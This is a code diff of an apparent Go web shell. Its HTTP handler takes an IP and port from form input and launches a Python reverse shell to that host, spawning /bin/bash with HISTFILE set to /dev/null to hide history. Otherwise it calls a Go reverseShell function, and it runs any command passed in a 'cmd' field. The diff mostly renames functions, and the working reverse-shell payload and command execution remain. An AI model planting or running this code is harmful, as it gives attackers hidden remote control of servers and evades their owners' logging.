@@ -85,11 +85,10 @@ func handler(w http.ResponseWriter, r *http.Request) {
             ver := strings.Join(r.Form["ver"], " ")
             if runtime.GOOS != "windows" {
                 if ver == "py" {
-                    payload := "python -c 'import os, pty, socket; h = \"" + ip + "\"; p = " + port + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'" 
-                    fmt.Printf(payload)
-                    go RunCmd(payload)
+                    payload := "python -c 'import os, pty, socket; h = \"" + ip + "\"; p = " + port + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'"
+                    go runCmd(payload)
                 }else {
-                    go ReverseShell(ip, port)
+                    go reverseShell(ip, port)
                 }
                 out = "Reverse shell launched to " + ip + ":" + port
             } else {
@@ -99,7 +98,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
         }
         if len(r.Form["cmd"]) > 0 {
             cmd := strings.Join(r.Form["cmd"], " ")
-            out = "$ " + cmd + "\n" + RunCmd(cmd)
+            out = "$ " + cmd + "\n" + runCmd(cmd)
         }
     }
 
